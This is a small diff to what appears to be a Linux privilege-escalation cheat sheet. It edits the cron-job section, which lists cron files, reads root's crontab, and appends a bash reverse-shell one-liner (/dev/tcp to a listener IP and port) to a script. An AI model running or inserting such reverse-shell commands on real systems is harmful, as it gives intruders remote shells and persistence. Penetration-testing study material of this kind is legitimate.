@@ -51,7 +51,7 @@ $ ls -al /etc/cron* /etc/at*
 $ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/> dev/null | grep -v "^#"
 
 Add a line to a file:
-$ echo "/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1" >> script.sh
+$ echo "/bin/bash -i >& /dev/tcp/192.168.119.1/443 0>&1" >> script.sh
 ```
 
 ###### Writable /etc/passwd or /etc/shadow
